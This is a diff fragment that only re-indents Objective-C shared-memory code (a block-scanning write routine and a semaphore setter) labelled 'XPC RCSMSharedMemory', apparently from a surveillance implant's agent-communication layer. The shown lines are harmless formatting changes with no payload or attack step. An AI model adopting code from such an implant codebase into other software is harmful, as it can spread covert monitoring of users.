+      do
+        {
+          memoryState = *(unsigned int *)(mSharedMemory + anOffset);
+
+          if (memoryState != SHMEM_FREE)
+            {
+              anOffset += sizeof (shMemoryLog);
+            }
+          else
+            {
+              memoryState = SHMEM_LOCKED;
+              break;
+            }
+
+          if (anOffset >= mSize)
+            {
 #ifdef DEBUG_SHMEM
-        infoLog(@"[XPC RCSMSharedMemory] SHMem - write didn't found an available memory block mSize = %#x", mSize);
+              infoLog(@"[XPC RCSMSharedMemory] SHMem - write didn't found an available memory block mSize = %#x", mSize);
 #endif
-        
-        return FALSE;
-      }
-    }
-    while (memoryState != SHMEM_FREE);
-    
+
+              return FALSE;
+            }
+        }
+      while (memoryState != SHMEM_FREE);
+
 #ifdef DEBUG_SHMEM    
-    shMemoryLog *shMemoryHeader= (shMemoryLog *)[aData bytes];
-    infoLog(@"[XPC RCSMSharedMemory] writeMemory agentID %#x, commandType %#x commandDataSize %#x at Off %#x", 
-          shMemoryHeader->agentID, shMemoryHeader->commandType, shMemoryHeader->commandDataSize, anOffset);
+      shMemoryLog *shMemoryHeader= (shMemoryLog *)[aData bytes];
+      infoLog(@"[XPC RCSMSharedMemory] writeMemory agentID %#x, commandType %#x commandDataSize %#x at Off %#x", 
+              shMemoryHeader->agentID, shMemoryHeader->commandType, shMemoryHeader->commandDataSize, anOffset);
 #endif
-    
-    memcpy((void *)(mSharedMemory + anOffset), [aData bytes], sizeof(shMemoryLog));
-  }
+
+      memcpy((void *)(mSharedMemory + anOffset), [aData bytes], sizeof(shMemoryLog));
+    }
   else
-  {
-    //memoryState = *(unsigned int *)(mSharedMemory + anOffset);
-    
-    memcpy((void *)(mSharedMemory + anOffset), [aData bytes], sizeof(shMemoryCommand));
-  }
-  
+    {
+      //memoryState = *(unsigned int *)(mSharedMemory + anOffset);
+
+      memcpy((void *)(mSharedMemory + anOffset), [aData bytes], sizeof(shMemoryCommand));
+    }
+
   return TRUE;
 }
 
@@ -1011,10 +1011,10 @@ static BOOL sandbox_compatibility(pid_t pid, int operation, int type)
 - (void)setSemaphoreName: (NSString *)value
 {
   if (value != mSemaphoreName)
-  {
-    [mSemaphoreName release];
-    mSemaphoreName = [value retain];
-  }
+    {
+      [mSemaphoreName release];
+      mSemaphoreName = [value retain];
+    }
 }
 
 @end
